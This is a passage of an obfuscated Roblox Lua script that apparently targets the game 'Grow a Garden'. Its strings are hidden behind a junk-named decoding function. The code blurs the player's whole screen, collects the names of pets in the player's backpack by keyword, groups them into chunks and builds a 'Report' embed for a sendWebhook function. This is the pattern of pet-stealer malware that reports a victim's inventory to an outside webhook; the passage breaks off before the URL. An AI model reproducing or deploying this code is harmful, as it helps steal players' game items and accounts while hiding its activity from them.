    local blur = Instance.new(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('zHngoRVdqJPlczytplPhOHjBJQeqBfZwRzLyngkcYtadycnBTyzUCfpQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('qpoviPDeiKqYGwrHeHZEuxhiGiUvjtzrVufNsRqWOboRzeRqoiQhYOxVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('RZxznTMxEdSiicoQZnVqTyqrtlglKPvBiotNmqDWpnrigsQILlwnCLeLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('oiAqlcRrDCutcoBxdEQrhDwANYGhawoVgNbdTpWHOKUeQuEjoiVCIuC8J+OkiBQZXRzIA==') .. tostring(i) .. lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('TdqltdalQcaWhgvqtsYHWYjhLjNVmoIGcjtkUveNPDtcpraeIOSREPV4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('bhnuaBGHOWiwsKgnknMGZrrGLGKlgbQbnIpcxtsvRoyoOjUSewMZZuvXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('xvXUwizMgSWtTosISYktxQRjVQSgLlHkqzjmoBpWhlpLWurCZNffjqd'),
        embeds = {{
            title = lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('nqLqZOhtPudpGuWvahzkrhpKdHtWscQJrDMmrOTQHLuKSGaxGidZOfQ8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaP
